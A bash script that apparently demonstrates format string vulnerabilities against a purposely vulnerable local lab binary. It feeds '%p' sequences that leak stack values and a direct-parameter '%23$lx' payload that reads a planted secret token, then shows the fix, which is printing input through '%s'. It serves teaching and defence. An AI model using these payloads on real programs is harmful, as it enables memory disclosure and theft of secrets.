#!/usr/bin/env bash
set -e

DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" >/dev/null 2>&1 && pwd)"
BIN="$DIR/format_vuln"

if [ ! -f "$BIN" ]; then
    echo "[*] Building $BIN..."
    make -C "$DIR"
fi

echo "================================================================="
echo "DEMO 1: Normal Benign Input"
echo "================================================================="
printf "System reboot required\n" | "$BIN"

echo ""
echo "================================================================="
echo "DEMO 2: Sequential Memory Leak via '%p %p %p %p %p %p'"
echo "Notice how the 6th value matches our input string 'AAAABBBB' (0x4242424241414141)!"
echo "================================================================="
printf "AAAABBBB %%p %%p %%p %%p %%p %%p\n" | "$BIN"

echo ""
echo "================================================================="
echo "DEMO 3: Arbitrary Stack Read via Direct Parameter Access (%23\$lx)"
echo "Target: Leaking 64-bit secret_token (0xDEADBEEFCAFE1337)"
echo "================================================================="
printf "Secret token value is: %%23\$lx\n" | "$BIN"

echo ""
echo "================================================================="
echo "DEMO 4: Safe Logger Enforcement (printf(\"%%s\", user_input))"
echo "Specifiers are treated strictly as text data, neutralizing the leak:"
echo "================================================================="
printf "Secret token value is: %%23\$lx\n" | "$BIN" --safe
